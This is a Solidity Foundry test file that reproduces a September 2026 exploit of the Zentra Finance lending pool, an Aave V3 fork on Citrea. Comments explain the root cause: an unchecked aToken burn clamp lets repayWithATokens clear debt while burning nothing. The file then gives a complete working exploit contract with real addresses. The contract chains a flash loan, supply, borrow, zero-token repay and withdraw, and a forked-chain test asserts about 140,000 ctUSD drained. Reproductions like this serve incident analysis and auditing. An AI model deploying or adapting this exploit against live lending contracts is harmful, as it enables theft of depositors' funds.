// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// Zentra Finance exploit — Citrea Mainnet (chain id 4114), 2026-09-09.
//
// Zentra's lending core is a fork of Aave V3 Core v3.0.x. The loss (~140,000 ctUSD + 30 USDC.e)
// came from a boundary condition in Zentra's OWN aToken accounting, not the March-2026 upstream
// Aave rounding bug. repayWithATokens lets the Pool mark a debt fully repaid while the aToken
// burns LESS than required — and when the caller holds ZERO aTokens the burn silently reduces
// all the way to zero, clearing the debt while destroying nothing.
//
// On-chain references (Citrea, block 12428145):
//   deploy    : 0x1f86da14f2d5543fbba2695d6de1a516cee76400ed43265c8ddc621665598f8c
//   exploit    : 0x9ac5df7e93988cd977e4b1b0564f559ec3096db2fe1abdd97e45c348e3074aa1  (execute())
//   attacker EOA   : 0xA73d72d6A858Df742fe756dA5Cb61C2288A95C17
//   exploit contract : 0x8d85840F4c05a5D7385498F2a75daa54c6507b4b
// NOTE on the hash: the aggregator hash originally cited for this incident
// (0x31ca0d...a8ea94) returns null on the Citrea mainnet node and the mainnet Blockscout
// explorer. The real exploit in block 12428145 is the execute() tx above; every address,
// amount and event below was pulled from its trace.
//
// Actors / contracts (all verified on explorer.mainnet.citrea.xyz):
//   Zentra Pool (Aave V3 proxy)       : 0xfb7908150b738e7dB9862007c66C9eb7850706F5
//                                       impl 0x93C562dC08D7B25370CeE0132dDabfb85839dB18
//   USDC.e (underlying, 6 dec)         : 0xE045e6c36cF77FAA2CfB54466D71A3aEF7bbE839
//   ctUSD  (underlying, 6 dec)         : 0x8D82c4E3c936C7B5724A382a9c5a4E6Eb7aB6d5D
//   zUSDC  (aToken USDC.e)             : 0x01465912C8cEc266237050f429fE1b88dAa56C0A
//   zctUSD (aToken ctUSD)              : 0xBA2a69b92e0071924c387A200409B658E4f6cac8
//                                       impl (AToken) 0x62Ff719aBCaedEad9055BA980FCE3821eBdDA694
//   variableDebtZenctUSD               : 0x5Eea9a01eec0B56935EFC77fc144b0826936F09C
//   variableDebtZenUSDC                : 0xD191C82a7bfb37e251fE2CA85777315a360164ab
//   Flash source (Algebra DEX pool)     : 0x172D2AB563AFDaACE7247A6592EE1be62e791165
//                                       token0 = ctUSD, token1 = USDC.e, fee tier 100 (0.01%),
//                                       held ~309,687 USDC.e at the parent block. The 200,000
//                                       USDC.e flash liquidity came from here (flash fee 20 USDC.e).
//
// ROOT CAUSE (verified against the deployed AToken source, contract "AToken" impl 0x62Ff71...):
//   ScaledBalanceTokenBase._burnScaled() scales the burn with rayDivCeil (_scaleForBurn), then:
//
//       uint256 scaledBalance = super.balanceOf(user);
//       // Safety guard: ceil-rounding the burn ... can overshoot the user's scaled balance by 1
//       // wei ... Cap the scaled burn to avoid underflowing _burn on withdraw(max)/liquidation.
//       if (amountScaled > scaledBalance) {
//           amountScaled = scaledBalance;      // <-- clamp, with NO max-difference check
//       }
//       ...
//       _burn(user, amountScaled.toUint128()); // burns 0 when the user holds 0 aTokens
//
//   The clamp was meant to absorb a <=1-wei ceil overshoot. There is no
//   `require(amountScaled - scaledBalance <= 1)`, so a caller holding ZERO aTokens has the burn
//   reduced from the full amount all the way to zero — _burn(user, 0) is a no-op, does not revert,
//   and the emitted Burn event still carries the requested amount (which is why the trace shows a
//   140000000001 "burn" from an account that never held any zctUSD). Meanwhile Pool.executeRepay
//   burns the full variableDebt and records the repayment as complete.
//
//   Pool.repayWithATokens is `public virtual override` with no role/modifier and onBehalfOf =
//   msg.sender, i.e. fully permissionless (no privileged role, no signer) — confirmed in the Pool
//   impl and by the trace (the arbitrary exploit contract, not a Zentra role, calls it directly).
//
// Attack (reproduced below, single tx, exactly as traced):
//   1. Flash 200,000 USDC.e from the Algebra DEX pool.
//   2. supply() it as collateral (mints 200,000 zUSDC).
//   3. borrow() 140,000 ctUSD against it (mints 140,000 variableDebtZenctUSD).
//   4. repayWithATokens(ctUSD, debt + 1) while holding ZERO zctUSD -> debt cleared, ~0 aTokens
//      burned. The +1 base unit covers the 1-wei ceil accrual so paybackAmount == full debt.
//   5. withdraw(USDC.e, max) -> the 200,000 collateral comes back in full (debt is now 0).
//   6. Same trick for USDC.e: supply a little ctUSD, borrow 30 USDC.e, repayWithATokens(30 + 1)
//      holding zero zUSDC, withdraw the ctUSD collateral back.
//   7. Repay the flash (200,000 + 20 fee). Keep ~140,000 ctUSD and the leftover USDC.e.
//
// Protocol loss = 140,000 ctUSD + 30 USDC.e. Attacker keeps 140,000 ctUSD; net USDC.e is ~10
// after the 20 USDC.e flash fee — matching the 139999999999 ctUSD + 9999999 USDC.e the real
// attacker EOA received.
//
// Run:
//   forge test --contracts src/test/2026-09/ZentraFinance_exp.sol -vvv

// Algebra (Uni-V3-style concentrated-liquidity) pool exposing flash().
interface IAlgebraPool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IZentraPool {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(
        address asset,
        uint256 amount,
        uint256 interestRateMode,
        uint16 referralCode,
        address onBehalfOf
    ) external;
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
    function repayWithATokens(address asset, uint256 amount, uint256 interestRateMode) external returns (uint256);
}

contract ZentraFinanceExploit {
    IAlgebraPool constant FLASH_POOL = IAlgebraPool(0x172D2AB563AFDaACE7247A6592EE1be62e791165);
    IZentraPool constant POOL = IZentraPool(0xfb7908150b738e7dB9862007c66C9eb7850706F5);

    IERC20 constant USDCe = IERC20(0xE045e6c36cF77FAA2CfB54466D71A3aEF7bbE839);
    IERC20 constant ctUSD = IERC20(0x8D82c4E3c936C7B5724A382a9c5a4E6Eb7aB6d5D);
    IERC20 constant vDebtCtUSD = IERC20(0x5Eea9a01eec0B56935EFC77fc144b0826936F09C);
    IERC20 constant vDebtUSDCe = IERC20(0xD191C82a7bfb37e251fE2CA85777315a360164ab);

    uint256 constant VARIABLE = 2;
    uint256 constant FLASH_USDCE = 200_000e6; // 200,000 USDC.e temporary collateral
    uint256 constant BORROW_CTUSD = 140_000e6; // 140,000 ctUSD drained
    uint256 constant COLLATERAL2_CTUSD = 50e6; // seed collateral for the USDC.e leg
    uint256 constant BORROW2_USDCE = 30e6; // 30 USDC.e drained

    address immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function run() external {
        // token1 of the pool is USDC.e, so the flash amount goes in amount1.
        FLASH_POOL.flash(address(this), 0, FLASH_USDCE, "");
        // Sweep proceeds to the caller (the test contract).
        USDCe.transfer(owner, USDCe.balanceOf(address(this)));
        ctUSD.transfer(owner, ctUSD.balanceOf(address(this)));
    }

    function algebraFlashCallback(uint256, uint256 fee1, bytes calldata) external {
        require(msg.sender == address(FLASH_POOL), "bad flash callback");

        // --- ctUSD leg: drain 140,000 ctUSD ---
        USDCe.approve(address(POOL), type(uint256).max);
        POOL.supply(address(USDCe), FLASH_USDCE, address(this), 0); // 200k USDC.e collateral
        POOL.borrow(address(ctUSD), BORROW_CTUSD, VARIABLE, 0, address(this)); // 140k ctUSD out

        // Repay the ctUSD debt "with aTokens" while holding ZERO zctUSD. The aToken burn clamps
        // to the 0 balance, so nothing is burned, yet the Pool clears the full debt.
        uint256 ctUSDDebt = vDebtCtUSD.balanceOf(address(this));
        POOL.repayWithATokens(address(ctUSD), ctUSDDebt + 1, VARIABLE);

        // Debt is now 0, so the whole USDC.e collateral withdraws freely.
        POOL.withdraw(address(USDCe), type(uint256).max, address(this));

        // --- USDC.e leg: drain 30 USDC.e with the same trick ---
        ctUSD.approve(address(POOL), type(uint256).max);
        POOL.supply(address(ctUSD), COLLATERAL2_CTUSD, address(this), 0); // small ctUSD collateral
        POOL.borrow(address(USDCe), BORROW2_USDCE, VARIABLE, 0, address(this)); // 30 USDC.e out

        uint256 usdceDebt = vDebtUSDCe.balanceOf(address(this));
        POOL.repayWithATokens(address(USDCe), usdceDebt + 1, VARIABLE); // hold zero zUSDC -> burns 0
        POOL.withdraw(address(ctUSD), type(uint256).max, address(this)); // reclaim ctUSD collateral

        // Repay the flash (principal + 20 USDC.e fee).
        USDCe.transfer(address(FLASH_POOL), FLASH_USDCE + fee1);
    }
}

contract ZentraFinanceExp is BaseTestWithBalanceLog {
    function setUp() public {
        // Fork at the parent of the exploit block 12428145.
        vm.createSelectFork("citrea", 12_428_144);
        multiAssetLog = true;
        _addFundingToken(0x8D82c4E3c936C7B5724A382a9c5a4E6Eb7aB6d5D); // ctUSD
        _addFundingToken(0xE045e6c36cF77FAA2CfB54466D71A3aEF7bbE839); // USDC.e
    }

    /// forge-config: default.evm_version = "cancun"
    function testExploit() public balanceLog {
        ZentraFinanceExploit exploit = new ZentraFinanceExploit();

        IERC20 ctUSD = IERC20(0x8D82c4E3c936C7B5724A382a9c5a4E6Eb7aB6d5D);
        IERC20 USDCe = IERC20(0xE045e6c36cF77FAA2CfB54466D71A3aEF7bbE839);

        exploit.run();

        uint256 ctUSDGain = ctUSD.balanceOf(address(this));
        uint256 usdceGain = USDCe.balanceOf(address(this));

        emit log_named_decimal_uint("ctUSD drained", ctUSDGain, 6);
        emit log_named_decimal_uint("USDC.e kept (net of flash fee)", usdceGain, 6);

        // ~140,000 ctUSD stolen (protocol also lost 30 USDC.e; attacker nets ~10 after the fee).
        assertGe(ctUSDGain, 139_000e6, "ctUSD gain below expected");
        assertLe(ctUSDGain, 140_001e6, "ctUSD gain above expected");
        assertGt(usdceGain, 0, "expected positive USDC.e");
    }
}
